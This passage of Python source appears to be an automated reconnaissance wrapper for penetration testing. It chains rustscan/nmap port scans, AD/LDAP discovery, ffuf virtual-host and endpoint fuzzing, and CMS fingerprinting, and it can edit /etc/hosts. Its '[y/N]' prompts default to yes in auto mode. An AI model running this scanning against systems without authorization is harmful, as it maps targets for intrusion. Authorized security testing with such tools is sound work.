        print(f"[+] Stable endpoint baseline detected: {results[0]}")
        return results[0]

    print("[*] No stable endpoint baseline detected.")
    return None


def parse_ffuf_endpoint_results(json_file, target):

    try:
        with open(json_file, "r") as f:
            data = json.load(f)
    except Exception:
        print("[-] Failed to parse endpoint ffuf output.")
        return

    results = data.get("results", [])

    if not results:
        print("\033[1m\033[37m[FUZZ]\033[0m No interesting endpoints found.")

        return

    print("\n\033[1m\033[37m[FUZZ]\033[0m Discovered endpoints:")

    discovered_paths = set()

    for entry in results:
        path = entry.get("input", {}).get("FUZZ")
        status = entry.get("status")

        if path:
            clean_path = path.lstrip("/")
            discovered_paths.add(clean_path)
            print(f"  - /{clean_path} (status: {status})")

    # -----------------------------------
    # Write wordlist-style TXT output
    # -----------------------------------
    txt_output = json_file.replace(".json", ".txt")

    try:
        with open(txt_output, "w") as f:
            for path in sorted(discovered_paths):
                f.write(path + "\n")

        print(f"\033[1m\033[37m[FUZZ]\033[0m Wordlist-style output saved to {txt_output}")

    except Exception as e:
        print(f"[-] Failed to write TXT output: {e}")


def run_endpoint_fuzzing(target, target_ip, wordlist):

    if not wordlist:
        print("\033[1m\033[37m[FUZZ]\033[0m No endpoint wordlist provided. Skipping.")
        return

    scheme = target["scheme"]
    domain = target["host"]
    port = target["port"]

    print(f"\n\033[1m\033[37m[FUZZ]\033[0m Endpoint fuzzing: {domain}")

    baseline = get_endpoint_baseline(target, target_ip)

    output_base = f"{domain}_{port}_endpoint"

    ffuf_cmd = [
        "ffuf",
        "-w", wordlist,
        "-t", "20",
        "-timeout", "10",
        "-ic",
        "-c"
    ]

    # URL building
    if scheme == "http":

        ffuf_cmd += [
            "-u", f"http://{target_ip}:{port}/FUZZ",
            "-H", f"Host: {domain}"
        ]

    else:

        resolve = f"{domain}:{port}:{target_ip}"

        ffuf_cmd += [
            "-u", f"https://{domain}:{port}/FUZZ",
            "--resolve", resolve,
            "-k"
        ]

    # Baseline handling
    if baseline:
        status, size = baseline
        ffuf_cmd += ["-fs", size]
        ffuf_cmd += ["-fc", status]
    else:
        ffuf_cmd += ["-ac"]

    ffuf_cmd += [
        "-of", "json",
        "-o", f"{output_base}.json"
    ]

    print("\033[1m\033[36m[CMD]\033[0m", " ".join(ffuf_cmd))

    run_interruptible_command(ffuf_cmd, "ENDPOINT FUZZ")

    parse_ffuf_endpoint_results(
        f"{output_base}.json",
        target
    )


def expand_web_targets(validated_targets, wordlist_for_subdomain, target_ip):

    web_queue = deque(validated_targets)
    all_targets = {}
    
    while web_queue:

        target = web_queue.popleft()

        target_id = f"{target['scheme']}://{target['host']}:{target['port']}"

        if target_id in all_targets:
            continue

        all_targets[target_id] = target

        # csak root domainre
        if wordlist_for_subdomain and target["supports_vhost_enum"]:
            new_targets = run_vhost_enum(target, wordlist_for_subdomain, target_ip)

            for nt in new_targets:
                web_queue.append(nt)

    return list(all_targets.values())


def scan_web_targets(final_targets, target_ip, crawler_hosts_updated, wordlist_for_endpoints, auto_mode):

    for target in final_targets:

        target_id = f"{target['scheme']}://{target['host']}:{target['port']}"

        print_sub_section_title(f"Scanning: {target_id} ", "34")

        cms_info = detect_cms(target, target_ip)

        skip_aggressive = False

        if cms_info.get("is_cms"):
            print(f"[!] CMS detected: {cms_info['cms_type']} ({cms_info['confidence']})")

            if not ask_user(
                "Run web crawling and endpoint fuzzing anyway? [y/N]: ",
                default="yes",
                auto_mode = auto_mode
            ):
                skip_aggressive = True

        if skip_aggressive:
            print("[*] Skipping aggressive modules.")
            continue

        # Crawler only if hosts updated
        if crawler_hosts_updated:
            run_web_crawler(target, target_ip, auto_mode)
        else:
            print("[*] Web crawler skipped (hosts file not updated).")

        run_endpoint_fuzzing(target, target_ip, wordlist_for_endpoints)


def extract_domains_from_targets(final_targets):

    return {
        t["host"].lower()
        for t in final_targets
        if is_valid_domain(t["host"])
    }


def process_web_targets(validated_targets, wordlist_for_subdomain, target_ip, wordlist_for_endpoints, auto_mode):

    print_sub_section_title("Expanding Web Targets (VHOST ENUM)", "34")
    final_targets = expand_web_targets(
        validated_targets,
        wordlist_for_subdomain,
        target_ip
    )

    print("\n[+] Final web target list:")
    for t in final_targets:
        print(f"  - {t['scheme']}://{t['host']}:{t['port']}")

    # -----------------------------------
    # Hosts update decision for crawler
    # -----------------------------------
    crawler_hosts_updated = True

    domains_for_hosts = extract_domains_from_targets(final_targets)

    if domains_for_hosts:

        print("\n[!] The bober-crawler tool requires proper domain resolution.")
        print("    To run the crawler, the above domains must be present in /etc/hosts.")
        print("    If you choose not to update the hosts file, the crawler will be skipped.\n")

        if ask_user(
            "Do you want to update /etc/hosts with the final web target domains? [y/N]: ",
            default="yes",
            auto_mode = auto_mode
        ):
            update_hosts_file(target_ip, domains_for_hosts)
        else:
            print("[*] Hosts update declined. Web crawler will be skipped.")
            crawler_hosts_updated = False

    else:
        print("[*] No valid domains available for hosts update.")

    # -----------------------------------
    # PHASE 2: Scanning
    # -----------------------------------
    scan_web_targets(final_targets, target_ip, crawler_hosts_updated, wordlist_for_endpoints, auto_mode)


def generate_random_subdomain(length=12):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def get_vhost_baseline(target, target_ip):

    scheme = target["scheme"]
    domain = target["host"]
    port = target["port"]

    results = []

    print("[*] Calculating vhost baseline...")

    for _ in range(3):

        random_sub = generate_random_subdomain()
        host_header = f"{random_sub}.{domain}"

        if scheme == "http":
            url = f"http://{target_ip}:{port}"

            cmd = [
                "curl",
                "-s",
                "-k",
                "-o", "/dev/null",
                "-w", "%{http_code} %{size_download}",
                "-H", f"Host: {host_header}",
                url
            ]

        else:  # https
            url = f"https://{domain}:{port}"
            resolve = f"{domain}:{port}:{target_ip}"

            cmd = [
                "curl",
                "-s",
                "-k",
                "-o", "/dev/null",
                "-w", "%{http_code} %{size_download}",
                "--resolve", resolve,
                "-H", f"Host: {host_header}",
                url
            ]

        result = subprocess.run(cmd, capture_output=True, text=True)

        output = result.stdout.strip()

        if not output:
            continue

        try:
            status, size = output.split()
            results.append((status, size))
        except:
            continue

    if len(results) < 3:
        print("[-] Baseline measurement unstable.")
        return None

    if len(set(results)) == 1:
        print(f"[+] Stable baseline detected: {results[0]}")
        return results[0]

    print("[*] No stable wildcard baseline detected.")
    return None


def run_vhost_enum(target, wordlist, target_ip):

    scheme = target["scheme"]
    domain = target["host"]
    port = target["port"]

    print(f"\n\033[1m\033[37m[VHOST]\033[0m Enumerating: {domain}")

    baseline = get_vhost_baseline(target, target_ip)

    output_base = f"{domain}_{port}_vhost"

    ffuf_cmd = [
        "ffuf",
        "-w", wordlist,
        "-t", "10",
        "-timeout", "10",
        "-ic",
        "-c"
    ]

    if scheme == "http":

        ffuf_cmd += [
            "-u", f"http://{target_ip}:{port}",
            "-H", f"Host: FUZZ.{domain}"
        ]

    else:  # https

        resolve = f"{domain}:{port}:{target_ip}"

        ffuf_cmd += [
            "-u", f"https://{domain}:{port}",
            "--resolve", resolve,
            "-H", f"Host: FUZZ.{domain}",
            "-k"
        ]

    # Baseline handling
    if baseline:
        status, size = baseline
        ffuf_cmd += ["-fs", size]
        ffuf_cmd += ["-fc", status]
    else:
        ffuf_cmd += ["-ac"]

    ffuf_cmd += [
        "-of", "json",
        "-o", f"{output_base}.json"
    ]

    print("\033[1m\033[36m[CMD]\033[0m", " ".join(ffuf_cmd))

    run_interruptible_command(ffuf_cmd, "VHOST ENUM")

    return parse_ffuf_vhost_results(
        f"{output_base}.json",
        target
    )


def parse_ffuf_vhost_results(json_file, parent_target):

    new_targets = []

    try:
        with open(json_file, "r") as f:
            data = json.load(f)
    except Exception:
        print("[-] Failed to parse ffuf output.")
        return new_targets

    results = data.get("results", [])

    for entry in results:

        fuzz_value = entry.get("input", {}).get("FUZZ")

        if not fuzz_value:
            continue

        new_host = f"{fuzz_value}.{parent_target['host']}"

        new_target = {
            "host": new_host,
            "port": parent_target["port"],
            "scheme": parent_target["scheme"],
            "is_domain": True,
            "supports_vhost_enum": False,  # STOP HERE
            "vhost_fuzzed": True
        }

        print(f"[+] New vhost discovered: {new_host}")

        new_targets.append(new_target)

    return new_targets


def fetch_url(target, target_ip, path="/", head=False):

    scheme = target["scheme"]
    domain = target["host"]
    port = target["port"]

    method_flag = "-I" if head else ""

    if scheme == "http":
        url = f"http://{target_ip}:{port}{path}"

        cmd = [
            "curl",
            "-s",
            "-k",
            method_flag,
            "-H", f"Host: {domain}",
            url
        ]

    else:
        url = f"https://{domain}:{port}{path}"
        resolve = f"{domain}:{port}:{target_ip}"

        cmd = [
            "curl",
            "-s",
            "-k",
            method_flag,
            "--resolve", resolve,
            url
        ]

    # remove empty string if head=False
    cmd = [c for c in cmd if c]

    result = subprocess.run(cmd, capture_output=True, text=True)

    return result.stdout


def detect_cms(target, target_ip):

    print(f"[*] CMS detection for {target['host']}")

    evidence = {
        "wordpress": 0,
        "drupal": 0,
        "joomla": 0
    }

    # --------------------------------
    # 1 Header check
    # --------------------------------
    headers = fetch_url(target, target_ip, head=True)

    if "X-Pingback" in headers:
        evidence["wordpress"] += 1

    if "X-Generator: Drupal" in headers:
        evidence["drupal"] += 2

    if "Joomla" in headers:
        evidence["joomla"] += 1

    # --------------------------------
    # 2 HTML meta generator
    # --------------------------------
    body = fetch_url(target, target_ip)

    if 'content="WordPress' in body:
        return {"is_cms": True, "cms_type": "wordpress", "confidence": "high"}

    if 'content="Drupal' in body:
        return {"is_cms": True, "cms_type": "drupal", "confidence": "high"}

    if 'content="Joomla' in body:
        return {"is_cms": True, "cms_type": "joomla", "confidence": "high"}

    # --------------------------------
    # 3 Passive path existence checks
    # --------------------------------

    # WordPress
    wp_login = fetch_url(target, target_ip, "/wp-login.php", head=True)
    if "200" in wp_login or "302" in wp_login:
        evidence["wordpress"] += 1

    wp_content = fetch_url(target, target_ip, "/wp-content/", head=True)
    if "200" in wp_content or "403" in wp_content:
        evidence["wordpress"] += 1

    # Drupal
    drupal_core = fetch_url(target, target_ip, "/core/", head=True)
    if "200" in drupal_core:
        evidence["drupal"] += 1

    drupal_sites = fetch_url(target, target_ip, "/sites/default/", head=True)
    if "200" in drupal_sites or "403" in drupal_sites:
        evidence["drupal"] += 1

    # Joomla
    joomla_admin = fetch_url(target, target_ip, "/administrator/", head=True)
    if "200" in joomla_admin or "302" in joomla_admin:
        evidence["joomla"] += 1

    # --------------------------------
    # 4 Final decision
    # --------------------------------

    cms_type = max(evidence, key=evidence.get)
    score = evidence[cms_type]

    if score >= 2:
        return {
            "is_cms": True,
            "cms_type": cms_type,
            "confidence": "medium"
        }

    return {"is_cms": False}

def print_section_title(title, color_code="37"):
    """Print a clean, bold, colored section title with a double-line separator."""
    print("\n")
    print("=" * (len(title) + 6))
    print(f"\033[1;{color_code}m{title}\033[0m")
    print("=" * (len(title) + 6))

def print_sub_section_title(title, color_code="36"):
    """Print a clean, bold, colored section title."""
    print(f"\n\033[1;{color_code}m{title}\033[0m")
    print("-" * (len(title) + 6))  # vizuális elválasztó


# -----------------------------
# MAIN
# -----------------------------
def main():
    try:
        parser = argparse.ArgumentParser(description="BoberAutoScanner - Automated Recon Wrapper")
        parser.add_argument("target", help="Target IP address")
        parser.add_argument("-u", "--username", help="Username")
        parser.add_argument("-p", "--password", help="Password")

        parser.add_argument(
            "-sn", "--skip-nmap",
            action="store_true",
            help="Skip Nmap and Rustscan phases (assume existing scan files)"
        )

        parser.add_argument(
            "-spu", "--skip-passwordless-users",
            action="store_true",
            help="Skip anonymous and guest authentication rounds"
        )

        parser.add_argument(
            "-csr", "--create-smb-report",
            action="store_true",
            help="Create extended SMB report (requires high privileges)"
        )

        parser.add_argument(
            "-wfs", "--wordlist-for-subdomain",
            help="Wordlist path for virtual host fuzzing"
        )

        parser.add_argument(
            "-wfe", "--wordlist-for-endpoints",
            help="Wordlist path for endpoint fuzzing"
        )

        parser.add_argument(
            "--no-auto",
            action="store_true",
            help="Disable automatic timeout-based answers (fully interactive mode)"
        )

        args = parser.parse_args()

        target_ip = args.target

        username = args.username
        password = args.password

        auto_mode = not args.no_auto

        if (username and password is None) or (password and username is None):
            print("[!] If you provide username or password, both must be specified.")
            sys.exit(1)

        # -----------------------------------
        # NMAP PHASE
        # -----------------------------------
        print_section_title("Nmap Phase", "37")
        if not args.skip_nmap:

            rust_output = run_rustscan(target_ip)
            ports = extract_ports(rust_output, target_ip)

            run_nmap_basic(target_ip, ports)
            run_nmap_full(target_ip, ports)
        else:
            print("\n[*] Skipping Nmap phase (--skip-nmap)")
            if not os.path.exists("nmap_all-ports_basic-info_TCP.txt") or not os.path.exists("rustscan_all-ports_TCP.txt"):
                print("\n[!] Basic Nmap files missing!")
                sys.exit(1)
            ports = extract_ports("rustscan_all-ports_TCP.txt", target_ip)
        
        # -----------------------------------
        # DOMAIN DISCOVERY PIPELINE
        # -----------------------------------
        print_section_title("Domain & Target Discovery", "37")

        port_list = ports.split(",")

        ad_core = None
        web_map = None
        nmap_full_output = "nmap_all-ports_all-info_TCP.txt"

        # 1 AD discovery
        if "389" in port_list:
            ad_core = discover_ad_via_ldap(target_ip)

        # 2 Web discovery
        web_map = discover_web_domains(nmap_full_output, target_ip)

        # 3 Global domain aggregation
        global_domains = build_global_domain_list(
            ad_core,
            web_map,
            nmap_full_output
        )

        # 4 Hosts update
        if global_domains:

            print("\n[!] The following domains were discovered:")
            for d in sorted(global_domains):
                print(f"  - {d}")

            print("\n[!] Updating /etc/hosts may affect how Nmap resolves and fingerprints services.")
            print("    If you choose to update the hosts file, do NOT rerun this tool with Nmap scanning enabled.")
            print("    Instead, use the -sn / --skip-nmap option to avoid inconsistent scan results.\n")

            if ask_user(
                "Do you want to update /etc/hosts with the discovered domains? [y/N]: ",
                default="yes",
                auto_mode = auto_mode
            ):
                update_hosts_file(target_ip, global_domains)
            else:
                print("[*] Hosts file update skipped.")

        else:
            print("[*] No domains discovered for hosts update.")

        # --- AD / Windows Environment Enumeration ---
        print_section_title("Active Directory & Windows Environment Enumeration", "37")

        windows_likely = is_windows_likely(port_list)

        if windows_likely:
            print("\n[+] Target likely Windows / AD environment detected.")
        else:
            print("\n[*] No strong Windows indicators detected.")

        if windows_likely:
            execute_windows_strategy(target_ip, username, password, args.skip_passwordless_users, args.create_smb_report)

        # WEB VALIDATION PHASE
        # --- Web Service & Application Enumeration ---
        print_section_title("Web Service & Application Enumeration", "37")

        validated_targets = build_validated_web_targets(web_map, target_ip)

        if not validated_targets:
            print("\n=== VALID WEB TARGET LIST ===")
            print("[*] No valid web services detected. Skipping web modules.")
            print("[*] BoberAutoScanner finished.\n")
        else:
            print("\n=== VALID WEB TARGET LIST ===")
            for t in validated_targets:
                print(f"[+] {t['scheme']}://{t['host']}:{t['port']}")

            process_web_targets(
                validated_targets,
                args.wordlist_for_subdomain,
                target_ip,
                args.wordlist_for_endpoints,
                auto_mode
            )

    except KeyboardInterrupt:
        print("\n\n[!] Global interrupt received.")
        print("[*] All remaining scans cancelled.")
        print("[*] Cleaning up and exiting.\n")
        sys.exit(0)
